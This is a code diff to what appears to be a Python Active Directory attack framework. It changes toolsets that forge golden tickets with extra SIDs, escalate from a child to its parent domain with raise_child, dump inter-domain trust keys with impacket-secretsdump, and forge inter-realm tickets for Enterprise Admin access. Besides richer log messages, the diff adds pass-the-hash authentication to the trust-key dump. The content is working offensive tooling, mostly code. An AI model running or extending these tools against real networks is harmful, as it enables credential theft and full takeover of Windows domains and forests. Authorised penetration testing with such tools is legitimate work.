@@ -129,9 +129,23 @@ class GoldenTicketTools(Toolset):
         ]
 
         try:
-            logger.info("[*] Generating golden ticket for Administrator")
-            logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
+            logger.warning(
+                f"🎫 GOLDEN TICKET GENERATION: Child-to-parent escalation via extra-sid\n"
+                f"   Source domain: {domain}\n"
+                f"   Source SID: {domain_sid}\n"
+                f"   Extra SID (EA): {extra_sid}\n"
+                f"   User: Administrator"
+            )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            result = stdout or stderr or ""
+
+            if ".ccache" in result.lower() or "saved to" in result.lower():
+                logger.warning(
+                    f"🎯 GOLDEN TICKET CREATED!\n"
+                    f"   Domain: {domain}\n"
+                    f"   Ticket: Administrator.ccache\n"
+                    f"   Access: Enterprise Admin via extra-sid {extra_sid}"
+                )
 
             if self.state:
                 self.state.has_golden_ticket = True
@@ -146,7 +160,7 @@ class GoldenTicketTools(Toolset):
                     )
                     self.state.timeline.append(event)
 
-            return stdout or stderr
+            return result
         except Exception as e:
             return f"Error: {e!s}"
 
@@ -1855,13 +1869,22 @@ class TrustAttackTools(Toolset):
             cmd.extend(["-target-domain", target_domain])
 
         try:
-            logger.info(f"[*] Escalating from {child_domain} to parent domain")
+            target_desc = f" -> {target_domain}" if target_domain else " (auto-detect parent)"
+            logger.warning(
+                f"🔺 CHILD-TO-PARENT ESCALATION: raise_child invoked\n"
+                f"   Child domain: {child_domain}\n"
+                f"   Target: {target_desc}\n"
+                f"   Username: {username}"
+            )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)
 
             result = stdout + "\n" + (stderr or "")
 
             if "enterprise admin" in result.lower() or "golden ticket" in result.lower():
-                logger.info("[+] Child-to-parent escalation successful!")
+                logger.warning(
+                    f"🎯 CHILD-TO-PARENT ESCALATION SUCCESS!\n"
+                    f"   {child_domain} -> Enterprise Admin in parent domain"
+                )
                 result = (
                     "🚨 DOMAIN ESCALATION SUCCESSFUL!\n"
                     "\u2192 Enterprise Admin access obtained\n"
@@ -1913,15 +1936,41 @@ class TrustAttackTools(Toolset):
         trust_domain_name = trusted_domain.split(".", maxsplit=1)[0].upper()
         trust_account = f"{trust_domain_name}$"
 
-        cmd = [
-            "impacket-secretsdump",
-            f"{domain}/{username}:{password}@{dc_ip}",
-            "-just-dc-user",
-            trust_account,
-        ]
+        # Check if password is actually an NTLM hash
+        # Formats: "LM:NT" (64 chars with colon) or just "NT" (32 chars)
+        is_lm_nt = bool(re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", password))
+        is_nt_only = bool(re.match(r"^[a-fA-F0-9]{32}$", password))
+        is_hash = is_lm_nt or is_nt_only
+
+        if is_hash:
+            # Pass-the-hash: use -hashes flag
+            # impacket expects LM:NT format - use empty LM if only NT provided
+            hash_arg = password if is_lm_nt else f":{password}"
+            cmd = [
+                "impacket-secretsdump",
+                f"{domain}/{username}@{dc_ip}",
+                "-hashes",
+                hash_arg,
+                "-just-dc-user",
+                trust_account,
+            ]
+        else:
+            # Password auth
+            cmd = [
+                "impacket-secretsdump",
+                f"{domain}/{username}:{password}@{dc_ip}",
+                "-just-dc-user",
+                trust_account,
+            ]
 
         try:
-            logger.info(f"[*] Extracting trust key for {trusted_domain} from {domain}")
+            logger.warning(
+                f"🔐 TRUST KEY EXTRACTION: secretsdump for cross-forest attack\n"
+                f"   Source domain: {domain}\n"
+                f"   Target trust: {trusted_domain}\n"
+                f"   Trust account: {trust_account}\n"
+                f"   DC: {dc_ip}"
+            )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)
 
             result = stdout + "\n" + (stderr or "")
@@ -1936,7 +1985,12 @@ class TrustAttackTools(Toolset):
 
             if hash_match:
                 trust_hash = hash_match.group(1)
-                logger.warning(f"[+] Trust key extracted for {trusted_domain}!")
+                logger.warning(
+                    f"🎯 TRUST KEY EXTRACTED!\n"
+                    f"   Trust: {domain} <-> {trusted_domain}\n"
+                    f"   Account: {trust_account}\n"
+                    f"   Hash: {trust_hash[:8]}...{trust_hash[-8:]}"
+                )
                 result = (
                     f"🚨 TRUST KEY EXTRACTED FOR {trusted_domain}!\n"
                     f"→ Trust account: {trust_account}\n"
@@ -2028,9 +2082,12 @@ class TrustAttackTools(Toolset):
         ]
 
         try:
-            logger.info(
-                f"[*] Creating inter-realm ticket for {username} "
-                f"({source_domain} → {target_domain})"
+            logger.warning(
+                f"🎫 INTER-REALM TICKET CREATION: Golden ticket with extra-sid\n"
+                f"   Source: {source_domain} (SID: {source_sid})\n"
+                f"   Target: {target_domain} (SID: {target_sid})\n"
+                f"   EA SID: {enterprise_admin_sid}\n"
+                f"   User: {username}"
             )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
 
@@ -2039,7 +2096,11 @@ class TrustAttackTools(Toolset):
             if ".ccache" in result:
                 ticket_match = re.search(r"([^\s]+\.ccache)", result)
                 ticket_path = ticket_match.group(1) if ticket_match else f"{username}.ccache"
-                logger.warning(f"[+] Inter-realm ticket created: {ticket_path}")
+                logger.warning(
+                    f"🎯 INTER-REALM TICKET CREATED!\n"
+                    f"   Ticket: {ticket_path}\n"
+                    f"   Access: Enterprise Admin in {target_domain}"
+                )
                 result = (
                     f"🚨 INTER-REALM TICKET CREATED!\n"
                     f"→ Ticket: {ticket_path}\n"
